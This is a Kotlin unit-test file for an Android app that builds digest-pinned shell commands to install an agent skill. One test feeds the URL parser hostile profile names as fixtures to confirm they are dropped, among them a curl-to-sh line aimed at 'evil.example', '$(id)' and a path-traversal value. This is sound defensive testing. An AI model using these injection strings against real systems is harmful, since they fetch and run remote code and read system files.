package com.hermesvox

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File
import java.security.MessageDigest

/** #285: the path from "the repo has a skill" to "the agent has it" is one tap or one paste. */
class AppSkillTest {

    @Test fun aReleaseInstallsItsOwnTagsSkillANightlyTesting() {
        assertEquals("https://raw.githubusercontent.com/chezgoulet/hermes-vox/v0.9.1/skills/hermes-vox-app/SKILL.md", AppSkill.url("0.9.1"))
        assertEquals("https://raw.githubusercontent.com/chezgoulet/hermes-vox/testing/skills/hermes-vox-app/SKILL.md", AppSkill.url("0.9.0.1-nightly-ca0e66f"))
        assertEquals("https://raw.githubusercontent.com/chezgoulet/hermes-vox/testing/skills/hermes-vox-app/SKILL.md", AppSkill.url(""))
        // Never main: on the device, main had no skill (it arrives at the next release).
        assertTrue(!AppSkill.url("0.9.1").contains("/main/"))
        assertEquals("hermes skills install ${AppSkill.url("0.9.1")} --yes", AppSkill.command("0.9.1"))
    }

    @Test fun aNamedProfileComesFirst() {
        assertEquals("hermes -p work skills install ${AppSkill.url("0.9.1")} --yes", AppSkill.command("0.9.1", "work"))
        assertEquals("work", AppSkill.profileOf("https://gw.example/p/work"))
        assertEquals("work", AppSkill.profileOf("https://gw.example/p/work/"))
        assertEquals("", AppSkill.profileOf("https://gw.example"))
    }

    /**
     * A profile name is spliced into a shell command, and it arrives from an endpoint URL the
     * owner typed or pasted. Anything that is not one plain path segment is dropped before it
     * reaches a command line — dropped, never quoted into shape.
     */
    @Test fun aProfileNameThatCouldBeShellIsDropped() {
        val hostile = listOf(
            "https://gw.example/p/x;curl\${IFS}-s\${IFS}evil.example|sh",
            "https://gw.example/p/\$(id)",
            "https://gw.example/p/`id`",
            "https://gw.example/p/a b",
            "https://gw.example/p/../../../etc/passwd",
        )
        for (url in hostile) {
            assertEquals("no profile from: $url", "", AppSkill.profileOf(url))
            val cmd = AppSkill.command("0.9.1", AppSkill.profileOf(url))
            assertEquals("plain hermes for: $url", "hermes skills install ${AppSkill.url("0.9.1")} --yes", cmd)
            assertFalse(cmd.contains("evil"))
        }
        // The same guard applies to a profile passed directly, not only one parsed from a URL.
        val direct = AppSkill.command("0.9.1", "x;id")
        assertTrue(direct.startsWith("hermes skills install"))
        assertFalse(direct.contains(";id"))
    }

    @Test fun theTurnChecksBeforeItInstalls() {
        val turn = AppSkill.installTurn("0.9.1", "work")
        assertTrue(turn.contains(AppSkill.command("0.9.1", "work")))
        assertTrue(turn.contains(AppSkill.verifyCommand("0.9.1")))
        assertTrue(
            turn.indexOf(AppSkill.verifyCommand("0.9.1")) < turn.indexOf(AppSkill.command("0.9.1", "work")),
        )
    }

    /** The pasted script carries both lines, check first: a paste that skipped the pin would
     *  install whatever the ref holds now. */
    @Test fun thePasteScriptChecksThenInstalls() {
        val script = AppSkill.pasteScript("0.9.1", "work")
        assertEquals(AppSkill.verifyCommand("0.9.1") + "\n" + AppSkill.command("0.9.1", "work"), script)
        assertTrue(script.indexOf("curl") < script.indexOf("skills install"))
    }

    @Test fun theVerifyCommandPinsTheDigest() {
        assertEquals(
            "curl -fsSL ${AppSkill.url("0.9.1")} -o ${AppSkill.SCRATCH} && " +
                "echo \"${AppSkill.SKILL_SHA256}  ${AppSkill.SCRATCH}\" | sha256sum -c --quiet -",
            AppSkill.verifyCommand("0.9.1"),
        )
        assertEquals(64, AppSkill.SKILL_SHA256.length)
    }

    /**
     * The pin is only worth anything if it describes the file this build ships. Hashing the
     * repository file here means a skill edit that forgets the constant fails CI, instead of
     * shipping an install step that no honest agent can complete.
     */
    @Test fun thePinnedDigestIsTheSkillsOwn() {
        val skill = File("$REPO/skills/hermes-vox-app/SKILL.md").readBytes()
        val digest = MessageDigest.getInstance("SHA-256").digest(skill)
            .joinToString("") { "%02x".format(it) }
        assertEquals(
            "SKILL_SHA256 must be the digest of skills/hermes-vox-app/SKILL.md",
            digest,
            AppSkill.SKILL_SHA256,
        )
    }

    @Test fun theNameIsTheSkillsOwn() {
        val skill = File("$REPO/skills/hermes-vox-app/SKILL.md").readText()
        assertTrue(skill.contains("name: ${AppSkill.NAME}"))
    }

    @Test fun theSkillCarriesTheOfferKeyTheAppStores() {
        // #285: the skill's settings map must name the preference the app actually writes, or
        // an agent reading it points the user at a key nothing stores.
        val skill = File("$REPO/skills/hermes-vox-app/SKILL.md").readText()
        assertTrue(skill.contains("`${AppSkillInstall.PREF_OFFERED}`"))
    }

    private companion object {
        /** The Gradle test working directory is the module (`android/app`). */
        const val REPO = "../.."
    }
}
